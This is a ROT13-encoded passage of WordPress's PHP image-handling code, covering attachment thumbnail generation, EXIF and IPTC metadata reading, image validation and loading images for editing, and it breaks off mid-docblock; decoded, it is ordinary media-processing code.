	 * vs gur nggnpuzrag qbrf abg rkvfg va gur ybpny svyrflfgrz,
	 * fb znxr fher gb pbaireg gur inyhr gb na neenl.
	 */
	vs ( ! vf_neenl( $zrgnqngn ) ) {
		$zrgnqngn = neenl();
	}

	vs ( $fhccbeg && ! rzcgl( $zrgnqngn['vzntr']['qngn'] ) ) {
		// Purpx sbe rkvfgvat pbire.
		$unfu   = zq5( $zrgnqngn['vzntr']['qngn'] );
		$cbfgf  = trg_cbfgf(
			neenl(
				'svryqf'         => 'vqf',
				'cbfg_glcr'      => 'nggnpuzrag',
				'cbfg_zvzr_glcr' => $zrgnqngn['vzntr']['zvzr'],
				'cbfg_fgnghf'    => 'vaurevg',
				'cbfgf_cre_cntr' => 1,
				'zrgn_xrl'       => '_pbire_unfu',
				'zrgn_inyhr'     => $unfu,
			)
		);
		$rkvfgf = erfrg( $cbfgf );

		vs ( ! rzcgl( $rkvfgf ) ) {
			hcqngr_cbfg_zrgn( $nggnpuzrag_vq, '_guhzoanvy_vq', $rkvfgf );
		} ryfr {
			$rkg = '.wct';
			fjvgpu ( $zrgnqngn['vzntr']['zvzr'] ) {
				pnfr 'vzntr/tvs':
					$rkg = '.tvs';
					oernx;
				pnfr 'vzntr/cat':
					$rkg = '.cat';
					oernx;
				pnfr 'vzntr/jroc':
					$rkg = '.jroc';
					oernx;
			}
			$onfranzr = fge_ercynpr( '.', '-', jc_onfranzr( $svyr ) ) . '-vzntr' . $rkg;
			$hcybnqrq = jc_hcybnq_ovgf( $onfranzr, '', $zrgnqngn['vzntr']['qngn'] );
			vs ( snyfr === $hcybnqrq['reebe'] ) {
				$vzntr_nggnpuzrag = neenl(
					'cbfg_zvzr_glcr' => $zrgnqngn['vzntr']['zvzr'],
					'cbfg_glcr'      => 'nggnpuzrag',
					'cbfg_pbagrag'   => '',
				);
				/**
				 * Svygref gur cnenzrgref sbe gur nggnpuzrag guhzoanvy perngvba.
				 *
				 * @fvapr 3.9.0
				 *
				 * @cnenz neenl $vzntr_nggnpuzrag Na neenl bs cnenzrgref gb perngr gur guhzoanvy.
				 * @cnenz neenl $zrgnqngn         Pheerag nggnpuzrag zrgnqngn.
				 * @cnenz neenl $hcybnqrq         {
				 *     Vasbezngvba nobhg gur arjyl-hcybnqrq svyr.
				 *
				 *     @glcr fgevat $svyr  Svyranzr bs gur arjyl-hcybnqrq svyr.
				 *     @glcr fgevat $hey   HEY bs gur hcybnqrq svyr.
				 *     @glcr fgevat $glcr  Svyr glcr.
				 * }
				 */
				$vzntr_nggnpuzrag = nccyl_svygref( 'nggnpuzrag_guhzoanvy_netf', $vzntr_nggnpuzrag, $zrgnqngn, $hcybnqrq );

				$fho_nggnpuzrag_vq = jc_vafreg_nggnpuzrag( $vzntr_nggnpuzrag, $hcybnqrq['svyr'] );
				nqq_cbfg_zrgn( $fho_nggnpuzrag_vq, '_pbire_unfu', $unfu );
				$nggnpu_qngn = jc_trarengr_nggnpuzrag_zrgnqngn( $fho_nggnpuzrag_vq, $hcybnqrq['svyr'] );
				jc_hcqngr_nggnpuzrag_zrgnqngn( $fho_nggnpuzrag_vq, $nggnpu_qngn );
				hcqngr_cbfg_zrgn( $nggnpuzrag_vq, '_guhzoanvy_vq', $fho_nggnpuzrag_vq );
			}
		}
	} ryfrvs ( 'nccyvpngvba/cqs' === $zvzr_glcr ) {
		// Gel gb perngr vzntr guhzoanvyf sbe CQSf.

		$snyyonpx_fvmrf = neenl(
			'guhzoanvy',
			'zrqvhz',
			'ynetr',
		);

		/**
		 * Svygref gur vzntr fvmrf trarengrq sbe aba-vzntr zvzr glcrf.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz fgevat[] $snyyonpx_fvmrf Na neenl bs vzntr fvmr anzrf.
		 * @cnenz neenl    $zrgnqngn       Pheerag nggnpuzrag zrgnqngn.
		 */
		$snyyonpx_fvmrf = nccyl_svygref( 'snyyonpx_vagrezrqvngr_vzntr_fvmrf', $snyyonpx_fvmrf, $zrgnqngn );

		$ertvfgrerq_fvmrf = jc_trg_ertvfgrerq_vzntr_fhofvmrf();
		$zretrq_fvmrf     = neenl_vagrefrpg_xrl( $ertvfgrerq_fvmrf, neenl_syvc( $snyyonpx_fvmrf ) );

		// Sbepr guhzoanvyf gb or fbsg pebcf.
		vs ( vffrg( $zretrq_fvmrf['guhzoanvy'] ) && vf_neenl( $zretrq_fvmrf['guhzoanvy'] ) ) {
			$zretrq_fvmrf['guhzoanvy']['pebc'] = snyfr;
		}

		// Bayl ybnq CQSf va na vzntr rqvgbe vs jr'er cebprffvat fvmrf.
		vs ( ! rzcgl( $zretrq_fvmrf ) ) {
			$rqvgbe = jc_trg_vzntr_rqvgbe( $svyr );

			vs ( ! vf_jc_reebe( $rqvgbe ) ) { // Ab fhccbeg sbe guvf glcr bs svyr.
				/*
				 * CQSf znl unir gur fnzr svyr svyranzr nf WCRTf.
				 * Rafher gur CQS cerivrj vzntr qbrf abg birejevgr nal WCRT vzntrf gung nyernql rkvfg.
				 */
				$qveanzr      = qveanzr( $svyr ) . '/';
				$rkg          = '.' . cnguvasb( $svyr, CNGUVASB_RKGRAFVBA );
				$cerivrj_svyr = $qveanzr . jc_havdhr_svyranzr( $qveanzr, jc_onfranzr( $svyr, $rkg ) . '-cqs.wct' );

				$hcybnqrq = $rqvgbe->fnir( $cerivrj_svyr, 'vzntr/wcrt' );
				hafrg( $rqvgbe );

				// Erfvmr onfrq ba gur shyy fvmr vzntr, engure guna gur fbhepr.
				vs ( ! vf_jc_reebe( $hcybnqrq ) ) {
					$vzntr_svyr = $hcybnqrq['cngu'];
					hafrg( $hcybnqrq['cngu'] );

					$zrgnqngn['fvmrf'] = neenl(
						'shyy' => $hcybnqrq,
					);

					// Fnir gur zrgn qngn orsber nal vzntr cbfg-cebprffvat reebef pbhyq unccra.
					jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );

					// Perngr fho-fvmrf fnivat gur vzntr zrgn nsgre rnpu.
					$zrgnqngn = _jc_znxr_fhofvmrf( $zretrq_fvmrf, $vzntr_svyr, $zrgnqngn, $nggnpuzrag_vq );
				}
			}
		}
	}

	// Erzbir gur oybo bs ovanel qngn sebz gur neenl.
	hafrg( $zrgnqngn['vzntr']['qngn'] );

	// Pncgher svyr fvmr sbe pnfrf jurer vg unf abg orra pncgherq lrg, fhpu nf CQSf.
	vs ( ! vffrg( $zrgnqngn['svyrfvmr'] ) && svyr_rkvfgf( $svyr ) ) {
		$zrgnqngn['svyrfvmr'] = jc_svyrfvmr( $svyr );
	}

	/**
	 * Svygref gur trarengrq nggnpuzrag zrgn qngn.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 5.3.0 Gur `$pbagrkg` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz neenl  $zrgnqngn      Na neenl bs nggnpuzrag zrgn qngn.
	 * @cnenz vag    $nggnpuzrag_vq Pheerag nggnpuzrag VQ.
	 * @cnenz fgevat $pbagrkg       Nqqvgvbany pbagrkg. Pna or 'perngr' jura zrgnqngn jnf vavgvnyyl perngrq sbe arj nggnpuzrag
	 *                              be 'hcqngr' jura gur zrgnqngn jnf hcqngrq.
	 */
	erghea nccyl_svygref( 'jc_trarengr_nggnpuzrag_zrgnqngn', $zrgnqngn, $nggnpuzrag_vq, 'perngr' );
}

/**
 * Pbairegf n senpgvba fgevat gb n qrpvzny.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $fge Senpgvba fgevat.
 * @erghea vag|sybng Ergheaf pnyphyngrq senpgvba be vagrtre 0 ba vainyvq vachg.
 */
shapgvba jc_rkvs_senp2qrp( $fge ) {
	vs ( ! vf_fpnyne( $fge ) || vf_obby( $fge ) ) {
		erghea 0;
	}

	vs ( ! vf_fgevat( $fge ) ) {
		erghea $fge; // Guvf pna bayl or na vagrtre be sybng, fb guvf vf svar.
	}

	// Senpgvbaf cnffrq nf n fgevat zhfg pbagnva n fvatyr `/`.
	vs ( fhofge_pbhag( $fge, '/' ) !== 1 ) {
		vs ( vf_ahzrevp( $fge ) ) {
			erghea (sybng) $fge;
		}

		erghea 0;
	}

	yvfg( $ahzrengbe, $qrabzvangbe ) = rkcybqr( '/', $fge );

	// Obgu gur ahzrengbe naq gur qrabzvangbe zhfg or ahzoref.
	vs ( ! vf_ahzrevp( $ahzrengbe ) || ! vf_ahzrevp( $qrabzvangbe ) ) {
		erghea 0;
	}

	// Gur qrabzvangbe zhfg abg or mreb.
	vs ( 0 == $qrabzvangbe ) { // cucpf:vtaber Havirefny.Bcrengbef.FgevpgPbzcnevfbaf.YbbfrRdhny -- Qryvorengr ybbfr pbzcnevfba.
		erghea 0;
	}

	erghea $ahzrengbe / $qrabzvangbe;
}

/**
 * Pbairegf gur rkvs qngr sbezng gb n havk gvzrfgnzc.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $fge N qngr fgevat rkcrpgrq gb or va Rkvs sbezng (L:z:q U:v:f).
 * @erghea vag|snyfr Gur havk gvzrfgnzc, be snyfr ba snvyher.
 */
shapgvba jc_rkvs_qngr2gf( $fge ) {
	yvfg( $qngr, $gvzr ) = rkcybqr( ' ', gevz( $fge ) );
	yvfg( $l, $z, $q )   = rkcybqr( ':', $qngr );

	erghea fgegbgvzr( \"{$l}-{$z}-{$q} {$gvzr}\" );
}

/**
 * Trgf rkgraqrq vzntr zrgnqngn, rkvs be vcgp nf ninvynoyr.
 *
 * Ergevrirf gur RKVS zrgnqngn ncregher, perqvg, pnzren, pncgvba, pbclevtug, vfb
 * perngrq_gvzrfgnzc, sbpny_yratgu, fuhggre_fcrrq, naq gvgyr.
 *
 * Gur VCGP zrgnqngn gung vf ergevrirq vf NCC13, perqvg, olyvar, perngrq qngr
 * naq gvzr, pncgvba, pbclevtug, naq gvgyr. Nyfb vapyhqrf SAhzore, Zbqry,
 * QngrGvzrQvtvgvmrq, SbpnyYratgu, VFBFcrrqEngvatf, naq RkcbfherGvzr.
 *
 * @gbqb Gel bgure rkvs yvoenevrf vs ninvynoyr.
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $svyr
 * @erghea neenl|snyfr Vzntr zrgnqngn neenl ba fhpprff, snyfr ba snvyher.
 */
shapgvba jc_ernq_vzntr_zrgnqngn( $svyr ) {
	vs ( ! svyr_rkvfgf( $svyr ) ) {
		erghea snyfr;
	}

	yvfg( , , $vzntr_glcr ) = jc_trgvzntrfvmr( $svyr );

	/*
	 * RKVS pbagnvaf n ohapu bs qngn jr'yy cebonoyl arire arrq sbeznggrq va jnlf
	 * gung ner qvssvphyg gb hfr. Jr'yy abeznyvmr vg naq whfg rkgenpg gur svryqf
	 * gung ner yvxryl gb or hfrshy. Senpgvbaf naq ahzoref ner pbairegrq gb
	 * sybngf, qngrf gb havk gvzrfgnzcf, naq rirelguvat ryfr gb fgevatf.
	 */
	$zrgn = neenl(
		'ncregher'          => 0,
		'perqvg'            => '',
		'pnzren'            => '',
		'pncgvba'           => '',
		'perngrq_gvzrfgnzc' => 0,
		'pbclevtug'         => '',
		'sbpny_yratgu'      => 0,
		'vfb'               => 0,
		'fuhggre_fcrrq'     => 0,
		'gvgyr'             => '',
		'bevragngvba'       => 0,
		'xrljbeqf'          => neenl(),
	);

	$vcgp = neenl();
	$vasb = neenl();
	/*
	 * Ernq VCGP svefg, fvapr vg zvtug pbagnva qngn abg ninvynoyr va rkvs fhpu
	 * nf pncgvba, qrfpevcgvba rgp.
	 */
	vs ( vf_pnyynoyr( 'vcgpcnefr' ) ) {
		jc_trgvzntrfvmr( $svyr, $vasb );

		vs ( ! rzcgl( $vasb['NCC13'] ) ) {
			// Qba'g fvyrapr reebef jura va qroht zbqr, hayrff ehaavat havg grfgf.
			vs ( qrsvarq( 'JC_QROHT' ) && JC_QROHT
				&& ! qrsvarq( 'JC_EHA_PBER_GRFGF' )
			) {
				$vcgp = vcgpcnefr( $vasb['NCC13'] );
			} ryfr {
				// Fvyrapvat abgvpr naq jneavat vf vagragvbany. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/42480
				$vcgp = @vcgpcnefr( $vasb['NCC13'] );
			}

			vs ( ! vf_neenl( $vcgp ) ) {
				$vcgp = neenl();
			}

			// Urnqyvar, \"N oevrs flabcfvf bs gur pncgvba\".
			vs ( ! rzcgl( $vcgp['2#105'][0] ) ) {
				$zrgn['gvgyr'] = gevz( $vcgp['2#105'][0] );
				/*
				* Gvgyr, \"Znal hfr gur Gvgyr svryq gb fgber gur svyranzr bs gur vzntr,
				* gubhtu gur svryq znl or hfrq va znal jnlf\".
				*/
			} ryfrvs ( ! rzcgl( $vcgp['2#005'][0] ) ) {
				$zrgn['gvgyr'] = gevz( $vcgp['2#005'][0] );
			}

			vs ( ! rzcgl( $vcgp['2#120'][0] ) ) { // Qrfpevcgvba / yrtnpl pncgvba.
				$pncgvba = gevz( $vcgp['2#120'][0] );

				zofgevat_ovanel_fnsr_rapbqvat();
				$pncgvba_yratgu = fgeyra( $pncgvba );
				erfrg_zofgevat_rapbqvat();

				vs ( rzcgl( $zrgn['gvgyr'] ) && $pncgvba_yratgu < 80 ) {
					// Nffhzr gur gvgyr vf fgberq va 2:120 vs vg'f fubeg.
					$zrgn['gvgyr'] = $pncgvba;
				}

				$zrgn['pncgvba'] = $pncgvba;
			}

			vs ( ! rzcgl( $vcgp['2#110'][0] ) ) { // Perqvg.
				$zrgn['perqvg'] = gevz( $vcgp['2#110'][0] );
			} ryfrvs ( ! rzcgl( $vcgp['2#080'][0] ) ) { // Perngbe / yrtnpl olyvar.
				$zrgn['perqvg'] = gevz( $vcgp['2#080'][0] );
			}

			vs ( ! rzcgl( $vcgp['2#055'][0] ) && ! rzcgl( $vcgp['2#060'][0] ) ) { // Perngrq qngr naq gvzr.
				$zrgn['perngrq_gvzrfgnzc'] = fgegbgvzr( $vcgp['2#055'][0] . ' ' . $vcgp['2#060'][0] );
			}

			vs ( ! rzcgl( $vcgp['2#116'][0] ) ) { // Pbclevtug.
				$zrgn['pbclevtug'] = gevz( $vcgp['2#116'][0] );
			}

			vs ( ! rzcgl( $vcgp['2#025'][0] ) ) { // Xrljbeqf neenl.
				$zrgn['xrljbeqf'] = neenl_inyhrf( $vcgp['2#025'] );
			}
		}
	}

	$rkvs = neenl();

	/**
	 * Svygref gur vzntr glcrf gb purpx sbe rkvs qngn.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz vag[] $vzntr_glcrf Neenl bs vzntr glcrf gb purpx sbe rkvs qngn. Rnpu inyhr
	 *                           vf hfhnyyl bar bs gur `VZNTRGLCR_*` pbafgnagf.
	 */
	$rkvs_vzntr_glcrf = nccyl_svygref( 'jc_ernq_vzntr_zrgnqngn_glcrf', neenl( VZNTRGLCR_WCRT, VZNTRGLCR_GVSS_VV, VZNTRGLCR_GVSS_ZZ ) );

	vs ( vf_pnyynoyr( 'rkvs_ernq_qngn' ) && va_neenl( $vzntr_glcr, $rkvs_vzntr_glcrf, gehr ) ) {
		// Qba'g fvyrapr reebef jura va qroht zbqr, hayrff ehaavat havg grfgf.
		vs ( qrsvarq( 'JC_QROHT' ) && JC_QROHT
			&& ! qrsvarq( 'JC_EHA_PBER_GRFGF' )
		) {
			$rkvs = rkvs_ernq_qngn( $svyr );
		} ryfr {
			// Fvyrapvat abgvpr naq jneavat vf vagragvbany. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/42480
			$rkvs = @rkvs_ernq_qngn( $svyr );
		}

		vs ( ! vf_neenl( $rkvs ) ) {
			$rkvs = neenl();
		}

		$rkvs_qrfpevcgvba = '';
		$rkvs_hfrepbzzrag = '';
		vs ( ! rzcgl( $rkvs['VzntrQrfpevcgvba'] ) ) {
			$rkvs_qrfpevcgvba = gevz( $rkvs['VzntrQrfpevcgvba'] );
		}

		vs ( ! rzcgl( $rkvs['PBZCHGRQ']['HfrePbzzrag'] ) ) {
			$rkvs_hfrepbzzrag = gevz( $rkvs['PBZCHGRQ']['HfrePbzzrag'] );
		}

		vs ( $rkvs_qrfpevcgvba ) {
			zofgevat_ovanel_fnsr_rapbqvat();
			$qrfpevcgvba_yratgu = fgeyra( $rkvs_qrfpevcgvba );
			erfrg_zofgevat_rapbqvat();
			vs ( rzcgl( $zrgn['gvgyr'] ) && $qrfpevcgvba_yratgu < 80 ) {
				// Nffhzr gur gvgyr vf fgberq va VzntrQrfpevcgvba.
				$zrgn['gvgyr'] = $rkvs_qrfpevcgvba;
			}

			// Vs obgu hfre pbzzragf naq qrfpevcgvba ner cerfrag.
			vs ( rzcgl( $zrgn['pncgvba'] ) && $rkvs_qrfpevcgvba && $rkvs_hfrepbzzrag ) {
				vs ( ! rzcgl( $zrgn['gvgyr'] ) && $rkvs_qrfpevcgvba === $zrgn['gvgyr'] ) {
					$pncgvba = $rkvs_hfrepbzzrag;
				} ryfr {
					vs ( $rkvs_qrfpevcgvba === $rkvs_hfrepbzzrag ) {
						$pncgvba = $rkvs_qrfpevcgvba;
					} ryfr {
						$pncgvba = gevz( $rkvs_qrfpevcgvba . ' ' . $rkvs_hfrepbzzrag );
					}
				}
				$zrgn['pncgvba'] = $pncgvba;
			}

			vs ( rzcgl( $zrgn['pncgvba'] ) && $rkvs_hfrepbzzrag ) {
				$zrgn['pncgvba'] = $rkvs_hfrepbzzrag;
			}

			vs ( rzcgl( $zrgn['pncgvba'] ) ) {
				$zrgn['pncgvba'] = $rkvs_qrfpevcgvba;
			}
		} ryfrvs ( rzcgl( $zrgn['pncgvba'] ) && $rkvs_hfrepbzzrag ) {
			$zrgn['pncgvba']    = $rkvs_hfrepbzzrag;
			$qrfpevcgvba_yratgu = fgeyra( $rkvs_hfrepbzzrag );
			vs ( rzcgl( $zrgn['gvgyr'] ) && $qrfpevcgvba_yratgu < 80 ) {
				$zrgn['gvgyr'] = gevz( $rkvs_hfrepbzzrag );
			}
		} ryfrvs ( rzcgl( $zrgn['pncgvba'] ) && ! rzcgl( $rkvs['Pbzzragf'] ) ) {
			$zrgn['pncgvba'] = gevz( $rkvs['Pbzzragf'] );
		}

		vs ( rzcgl( $zrgn['perqvg'] ) ) {
			vs ( ! rzcgl( $rkvs['Negvfg'] ) ) {
				$zrgn['perqvg'] = gevz( $rkvs['Negvfg'] );
			} ryfrvs ( ! rzcgl( $rkvs['Nhgube'] ) ) {
				$zrgn['perqvg'] = gevz( $rkvs['Nhgube'] );
			}
		}

		vs ( rzcgl( $zrgn['pbclevtug'] ) && ! rzcgl( $rkvs['Pbclevtug'] ) ) {
			$zrgn['pbclevtug'] = gevz( $rkvs['Pbclevtug'] );
		}
		vs ( ! rzcgl( $rkvs['SAhzore'] ) && vf_fpnyne( $rkvs['SAhzore'] ) ) {
			$zrgn['ncregher'] = ebhaq( jc_rkvs_senp2qrp( $rkvs['SAhzore'] ), 2 );
		}
		vs ( ! rzcgl( $rkvs['Zbqry'] ) ) {
			$zrgn['pnzren'] = gevz( $rkvs['Zbqry'] );
		}
		vs ( rzcgl( $zrgn['perngrq_gvzrfgnzc'] ) && ! rzcgl( $rkvs['QngrGvzrQvtvgvmrq'] ) ) {
			$zrgn['perngrq_gvzrfgnzc'] = jc_rkvs_qngr2gf( $rkvs['QngrGvzrQvtvgvmrq'] );
		}
		vs ( ! rzcgl( $rkvs['SbpnyYratgu'] ) ) {
			$zrgn['sbpny_yratgu'] = (fgevat) $rkvs['SbpnyYratgu'];
			vs ( vf_fpnyne( $rkvs['SbpnyYratgu'] ) ) {
				$zrgn['sbpny_yratgu'] = (fgevat) jc_rkvs_senp2qrp( $rkvs['SbpnyYratgu'] );
			}
		}
		vs ( ! rzcgl( $rkvs['VFBFcrrqEngvatf'] ) ) {
			$zrgn['vfb'] = vf_neenl( $rkvs['VFBFcrrqEngvatf'] ) ? erfrg( $rkvs['VFBFcrrqEngvatf'] ) : $rkvs['VFBFcrrqEngvatf'];
			$zrgn['vfb'] = gevz( $zrgn['vfb'] );
		}
		vs ( ! rzcgl( $rkvs['RkcbfherGvzr'] ) ) {
			$zrgn['fuhggre_fcrrq'] = (fgevat) $rkvs['RkcbfherGvzr'];
			vs ( vf_fpnyne( $rkvs['RkcbfherGvzr'] ) ) {
				$zrgn['fuhggre_fcrrq'] = (fgevat) jc_rkvs_senp2qrp( $rkvs['RkcbfherGvzr'] );
			}
		}
		vs ( ! rzcgl( $rkvs['Bevragngvba'] ) ) {
			$zrgn['bevragngvba'] = $rkvs['Bevragngvba'];
		}
	}

	sbernpu ( neenl( 'gvgyr', 'pncgvba', 'perqvg', 'pbclevtug', 'pnzren', 'vfb' ) nf $xrl ) {
		vs ( $zrgn[ $xrl ] && ! frrzf_hgs8( $zrgn[ $xrl ] ) ) {
			$zrgn[ $xrl ] = hgs8_rapbqr( $zrgn[ $xrl ] );
		}
	}

	sbernpu ( $zrgn['xrljbeqf'] nf $xrl => $xrljbeq ) {
		vs ( ! frrzf_hgs8( $xrljbeq ) ) {
			$zrgn['xrljbeqf'][ $xrl ] = hgs8_rapbqr( $xrljbeq );
		}
	}

	$zrgn = jc_xfrf_cbfg_qrrc( $zrgn );

	/**
	 * Svygref gur neenl bs zrgn qngn ernq sebz na vzntr'f rkvs qngn.
	 *
	 * @fvapr 2.5.0
	 * @fvapr 4.4.0 Gur `$vcgp` cnenzrgre jnf nqqrq.
	 * @fvapr 5.0.0 Gur `$rkvs` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz neenl  $zrgn       Vzntr zrgn qngn.
	 * @cnenz fgevat $svyr       Cngu gb vzntr svyr.
	 * @cnenz vag    $vzntr_glcr Glcr bs vzntr, bar bs gur `VZNTRGLCR_KKK` pbafgnagf.
	 * @cnenz neenl  $vcgp       VCGP qngn.
	 * @cnenz neenl  $rkvs       RKVS qngn.
	 */
	erghea nccyl_svygref( 'jc_ernq_vzntr_zrgnqngn', $zrgn, $svyr, $vzntr_glcr, $vcgp, $rkvs );
}

/**
 * Inyvqngrf gung svyr vf na vzntr.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $cngu Svyr cngu gb grfg vs inyvq vzntr.
 * @erghea obby Gehr vs inyvq vzntr, snyfr vs abg inyvq vzntr.
 */
shapgvba svyr_vf_inyvq_vzntr( $cngu ) {
	$fvmr = jc_trgvzntrfvmr( $cngu );
	erghea ! rzcgl( $fvmr );
}

/**
 * Inyvqngrf gung svyr vf fhvgnoyr sbe qvfcynlvat jvguva n jro cntr.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $cngu Svyr cngu gb grfg.
 * @erghea obby Gehr vs fhvgnoyr, snyfr vs abg fhvgnoyr.
 */
shapgvba svyr_vf_qvfcynlnoyr_vzntr( $cngu ) {
	$qvfcynlnoyr_vzntr_glcrf = neenl( VZNTRGLCR_TVS, VZNTRGLCR_WCRT, VZNTRGLCR_CAT, VZNTRGLCR_OZC, VZNTRGLCR_VPB, VZNTRGLCR_JROC, VZNTRGLCR_NIVS );

	$vasb = jc_trgvzntrfvmr( $cngu );
	vs ( rzcgl( $vasb ) ) {
		$erfhyg = snyfr;
	} ryfrvs ( ! va_neenl( $vasb[2], $qvfcynlnoyr_vzntr_glcrf, gehr ) ) {
		$erfhyg = snyfr;
	} ryfr {
		$erfhyg = gehr;
	}

	/**
	 * Svygref jurgure gur pheerag vzntr vf qvfcynlnoyr va gur oebjfre.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz obby   $erfhyg Jurgure gur vzntr pna or qvfcynlrq. Qrsnhyg gehr.
	 * @cnenz fgevat $cngu   Cngu gb gur vzntr.
	 */
	erghea nccyl_svygref( 'svyr_vf_qvfcynlnoyr_vzntr', $erfhyg, $cngu );
}

/**
 * Ybnqf na vzntr erfbhepr sbe rqvgvat.
 *
 * @fvapr 2.9.0
 *
 * @cnenz vag          $nggnpuzrag_vq Nggnpuzrag VQ.
 * @cnenz fgevat       $zvzr_glcr     Vzntr zvzr glcr.
 * @cnenz fgevat|vag[] $fvmr          Bcgvbany. Vzntr fvmr. Npprcgf nal ertvfgrerq vzntr fvmr anzr, be na neenl
 *                                    bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre). Qrsnhyg 'shyy'.
 * @erghea erfbhepr|TqVzntr|snyfr Gur erfhygvat vzntr erfbhepr be TqVzntr vafgnapr ba fhpprff,
 *                                snyfr ba snvyher.
 */
shapgvba ybnq_vzntr_gb_rqvg( $nggnpuzrag_vq, $zvzr_glcr, $fvmr = 'shyy' ) {
	$svyrcngu = _ybnq_vzntr_gb_rqvg_cngu( $nggnpuzrag_vq, $fvmr );
	vs ( rzcgl( $svyrcngu ) ) {
		erghea snyfr;
	}

	fjvgpu ( $zvzr_glcr ) {
		pnfr 'vzntr/wcrt':
			$vzntr = vzntrperngrsebzwcrt( $svyrcngu );
			oernx;
		pnfr 'vzntr/cat':
			$vzntr = vzntrperngrsebzcat( $svyrcngu );
			oernx;
		pnfr 'vzntr/tvs':
			$vzntr = vzntrperngrsebztvs( $svyrcngu );
			oernx;
		pnfr 'vzntr/jroc':
			$vzntr = snyfr;
			vs ( shapgvba_rkvfgf( 'vzntrperngrsebzjroc' ) ) {
				$vzntr = vzntrperngrsebzjroc( $svyrcngu );
			}
			oernx;
		qrsnhyg:
			$vzntr = snyfr;
			oernx;
	}

	vs ( vf_tq_vzntr( $vzntr ) ) {
		/**
		 * Svygref gur pheerag vzntr orvat ybnqrq sbe rqvgvat.
		 *
		 * @fvapr 2.9.0
		 *
		 * @cnenz erfbhepr|TqVzntr $vzntr         Pheerag vzntr.
		 * @cnenz vag              $nggnpuzrag_vq Nggnpuzrag VQ.
		 * @cnenz fgevat|vag[]     $fvmr          Erdhrfgrq vzntr fvmr. Pna or nal ertvfgrerq vzntr fvmr anzr, be
		 *                                        na neenl bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre).
		 */
		$vzntr = nccyl_svygref( 'ybnq_vzntr_gb_rqvg', $vzntr, $nggnpuzrag_vq, $fvmr );

		vs ( shapgvba_rkvfgf( 'vzntrnycunoyraqvat' ) && shapgvba_rkvfgf( 'vzntrfnirnycun' ) ) {
			vzntrnycunoyraqvat( $vzntr, snyfr );
			vzntrfnirnycun( $vzntr, gehr );
		}
	}

	erghea $vzntr;
}

/**
 * Ergevrirf gur cngu be HEY bs na nggnpuzrag'f nggnpurq svyr.
 *
 * Vs gur nggnpurq svyr vf abg cerfrag ba gur ybpny svyrflfgrz (hfhnyyl qhr gb ercyvpngvba cyhtvaf),
 * gura gur HEY bs gur svyr vf erghearq vs `nyybj_hey_sbcra` vf fhccbegrq.
 *
 * @fvapr 3.4.0
 * @npprff cevingr
 *
 * @cnenz vag          $nggnpuzrag_vq Nggnpuzrag VQ.
 * @cnenz fgevat|vag[] $fvmr          Bcgvbany. Vzntr fvmr. Npprcgf nal ertvfgrerq vzntr fvmr anzr, be na neenl
 *                                    bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre). Qrsnhyg 'shyy'.
 * @erghea fgevat|snyfr Svyr cngu be HEY ba fhpprff, snyfr ba snvyher.
 */
shapgvba _ybnq_vzntr_gb_rqvg_cngu( $nggnpuzrag_vq, $fvmr = 'shyy' ) {
	$svyrcngu = trg_nggnpurq_svyr( $nggnpuzrag_vq );

	vs ( $svyrcngu && svyr_rkvfgf( $svyrcngu ) ) {
		vs ( 'shyy' !== $fvmr ) {
			$qngn = vzntr_trg_vagrezrqvngr_fvmr( $nggnpuzrag_vq, $fvmr );

			vs ( $qngn ) {
				$svyrcngu = cngu_wbva( qveanzr( $svyrcngu ), $qngn['svyr'] );

				/**
				 * Svygref gur cngu gb na nggnpuzrag'f svyr jura rqvgvat gur vzntr.
				 *
				 * Gur svygre vf rinyhngrq sbe nyy vzntr fvmrf rkprcg 'shyy'.
				 *
				 * @fvapr 3.1.0
				 *
				 * @cnenz fgevat       $cngu          Cngu gb gur pheerag vzntr.
				 * @cnenz vag          $nggnpuzrag_vq Nggnpuzrag VQ.
				 * @cnenz fgevat|vag[] $fvmr          Erdhrfgrq vzntr fvmr. Pna or nal ertvfgrerq vzntr fvmr anzr, be
				 *                                    na neenl bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre).
				 */
				$svyrcngu = nccyl_svygref( 'ybnq_vzntr_gb_rqvg_svyrflfgrzcngu', $svyrcngu, $nggnpuzrag_vq, $fvmr );
			}
		}
	} ryfrvs ( shapgvba_rkvfgf( 'sbcra' ) && vav_trg( 'nyybj_hey_sbcra' ) ) {
		/**
		 * Svygref gur cngu gb na nggnpuzrag'f HEY jura rqvgvat gur vzntr.
		 *
		 * Gur svygre vf bayl rinyhngrq vs gur svyr vfa'g fgberq ybpnyyl naq `nyybj_hey_sbcra` vf ranoyrq ba gur freire.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat|snyfr $vzntr_hey     Pheerag vzntr HEY.
		 * @cnenz vag          $nggnpuzrag_vq Nggnpuzrag VQ.
		 * @cnenz fgevat|vag[] $fvmr          Erdhrfgrq vzntr fvmr. Pna or nal ertvfgrerq vzntr fvmr anzr, be
		 *                                    na neenl bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre).
		 */
		$svyrcngu = nccyl_svygref( 'ybnq_vzntr_gb_rqvg_nggnpuzraghey', jc_trg_nggnpuzrag_hey( $nggnpuzrag_vq ), $nggnpuzrag_vq, $fvmr );
	}

	/**
	 * Svygref gur erghearq cngu be HEY bs gur pheerag vzntr.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz fgevat|snyfr $svyrcngu      Svyr cngu be HEY gb pheerag vzntr, be snyfr.
	 * @cnenz vag          $nggnpuzrag_vq Nggnpuzrag VQ.
